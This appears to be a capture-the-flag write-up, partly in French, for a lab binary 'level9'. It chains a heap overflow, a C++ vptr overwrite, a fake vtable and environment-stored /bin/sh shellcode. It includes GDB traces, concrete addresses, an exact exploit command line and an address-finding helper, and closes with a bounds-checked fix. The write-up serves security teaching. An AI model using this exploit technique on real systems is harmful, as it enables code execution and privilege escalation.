# Level9 — C++ Exploitation Concepts (Visual & Clear)

## Overview

Attack chain:

**Heap overflow → vptr overwrite → fake vtable → shellcode in env**

---

## 1. Heap Overflow

### Vulnerability

```c
memcpy(this + 4, src, strlen(src));
```

No bounds checking → overflow possible.

### Memory Layout

```
[ Object 1 ]
  vptr
  annotation[100]
  int

[ Object 2 ]
  vptr   ← TARGET
```

### What happens

Input written at `premier + 4` flows into `second->vptr`.

### Result

We can overwrite the second object's vptr.

---

## 2. vptr Overwrite

### What is vptr?

```
object
 ├── vptr → vtable
 └── data
```

### Virtual call

```cpp
obj->func()
```

Becomes:

```
func = obj->vptr[0]
call func
```

### Exploit idea

Overwrite `second->vptr`.

### Result

We control where the program looks for the function.

---

## 3. Fake vtable

### Normal vtable

```
vtable:
  [0] = function1
  [1] = function2
```

### Fake one

We force:

```
second->vptr = premier + 4
```

### Memory

```
premier + 4:
  [0] = addr_shellcode
  [1] = junk
```

### Execution (GDB)

```
eax = second->vptr
edx = *(eax)
call edx
```

### Result

Program jumps to our shellcode.

---

## 4. Shellcode in Environment

### Why env?

- argv used for overflow
- need stable executable memory

### Solution

Store shellcode in env:

```
PAYLOAD = NOP sled + shellcode
```

### Benefits

- stable address
- large space
- easy to find in GDB

---

## Final Chain

```
1. Overflow → reach second object
2. Overwrite vptr → point to controlled memory
3. Fake vtable → contains shellcode address
4. Virtual call → jumps to shellcode
```

### Mental model

Program: "Give me function table"  
Attacker: "Here it is 😈"  
Table: "→ shellcode"

---

## Memory layout (objects a & b)

```
a:
+0x00  vtable
+0x04  annotation[100]
+0x68  value

b:
+0x00  vtable   ← cible
+0x04  annotation[100]
+0x68  value
```

### Struct N

```c
typedef struct s_n {
    void *vtable;          // 4 octets
    char annotation[100]; // commence à l'offset 4
    int value;
} N;
```

### Heap layout (octets)

```
[ a chunk header : 8 bytes ]
[ a->vptr : 4 bytes ]
[ a->annotation : 100 bytes ]
[ a->value : 4 bytes ]
[ b chunk header : 8 bytes ]
[ b->vptr : 4 bytes ]
[ b->annotation : 100 bytes ]
[ b->value : 4 bytes ]
```

So:

```
a = 0x0804a008
a->annotation = a + 4 = 0x0804a00c
```

---

## GDB — main disassembly

```bash
0x08048650 <+92>:   mov    %ebx,0x18(%esp)
0x08048654 <+96>:   mov    0x1c(%esp),%eax
0x08048658 <+100>:  mov    %eax,0x14(%esp)   ; a
0x0804865c <+104>:  mov    0x18(%esp),%eax
0x08048660 <+108>:  mov    %eax,0x10(%esp)   ; b
```

Breakpoint après mise en place de a et b :

```bash
(gdb) break *0x08048664
(gdb) run AAA
(gdb) x/wx $esp+0x14
0xbffff724:     0x0804a008
(gdb) x/wx $esp+0x10
0xbffff720:     0x0804a078
```

---

## GDB — appel virtuel

```bash
0x0804867c <+136>:   mov    0x10(%esp),%eax   ; eax = b
0x08048680 <+140>:   mov    (%eax),%eax       ; eax = b->vptr
0x08048682 <+142>:   mov    (%eax),%edx       ; edx = *(b->vptr)
...
0x08048693 <+159>:   call   *%edx
```

Breakpoint avant le call :

```bash
(gdb) break *0x08048693
```

Après overflow : `b->vptr = 0x0804a00c` (premier+4), donc `*(b->vptr) = *(0x0804a00c) = 0xbffffc03` (adresse shellcode).

---

## Payload argv[1]

```
[ a->annotation first 4 ][ padding jusqu'à b->vptr ][ écrasement b->vptr ]
[ 03 fc ff bf          ][ 42 42 42 42 ...         ][ 0c a0 04 08       ]
```

En Python :

```bash
"\x63\xfc\xff\xbf"   → adresse shellcode (little-endian)
"B"*104              → padding
"\x0c\xa0\x04\x08"   → premier+4 (nouveau b->vptr)
```

Commande :

```bash
./level9 $(python -c 'print "\x03\xfc\xff\xbf" + "B"*104 + "\x0c\xa0\x04\x08"')
```

(Adapter l’adresse shellcode selon GDB ; souvent `\x63\xfc\xff\xbf` pour 0xbffffc63.)

---

## NOP sled

**NOP sled** : [NOP slide (Wikipedia)](https://en.wikipedia.org/wiki/NOP_slide)

Séquence d’instructions NOP (`\x90` en x86) placée **avant** le shellcode. Un saut imprécis dans cette zone finit par atteindre le shellcode.

```
[ shellcode ]
        ↑
        il faut tomber EXACTEMENT ici ❌

[ NOP NOP NOP NOP NOP NOP NOP NOP ][ shellcode ]
  ↑         ↑           ↑
  toutes ces adresses marchent ✅
```

| Taille        | Effet                  |
| ------------- | ---------------------- |
| 10–50 bytes   | faible tolérance       |
| 100–500 bytes | correct                |
| 1000+ bytes   | très robuste (level9)  |

`getenv("payload")` renvoie l’adresse du **début** de la valeur (début du NOP sled). Plusieurs adresses dans la zone sont valides (ex. 0xbffffc03, 0xbffffc63).

En mémoire processus :

```
Adresse haute
┌───────────────────────────────┐
│   ENVIRONNEMENT                │
│   payload=NOP+shellcode        │  ← shellcode ici
├───────────────────────────────┤
│   ARGUMENTS (argv)             │
│   argv[1] = overflow          │
├───────────────────────────────┤
│   STACK                        │
├───────────────────────────────┤
│   HEAP                         │
├───────────────────────────────┤
│   .bss / .data                 │
├───────────────────────────────┤
│   CODE (.text)                 │
└───────────────────────────────┘
Adresse basse
```

---

## Helper — adresse de payload

Pour afficher l’adresse de `payload` dans l’env (sans GDB) :

```c
#include <stdio.h>
#include <stdlib.h>

int main(void)
{
    char *p = getenv("payload");
    printf("payload at: %p\n", p);
    return 0;
}
```

Sur la VM :

```bash
scp -P 4242 helper.c level9@localhost:/tmp
# sur la VM :
gcc /tmp/helper.c -o /tmp/helper
env -i payload=$(python -c 'print "\x90"*1000 + "AAAA"') /tmp/helper
# ex. output: payload at: 0xbffffc03
```

Voir `Ressources/helper.c`.

---

## Shellcode utilisé

**Linux x86 execve("/bin/sh") — 28 bytes**  
Référence : [shell-storm.org/shellcode/files/shellcode-811.html](https://shell-storm.org/shellcode/files/shellcode-811.html) (Jean Pascal Pereira).

Explication instruction par instruction : `shellcode_pas_a_pas.md`.  
Résumé et octets : `shellcode.md`.

---

## Fix côté programme

Remplacer le memcpy sans borne par une copie limitée, par exemple :

```c
memcpy(this->annotation, s, strlen(s));
```

→

```c
size_t n = strlen(s);
if (n >= sizeof(this->annotation)) n = sizeof(this->annotation) - 1;
memcpy(this->annotation, s, n);
this->annotation[n] = '\0';
```

« Ne jamais copier plus de 100 octets. »
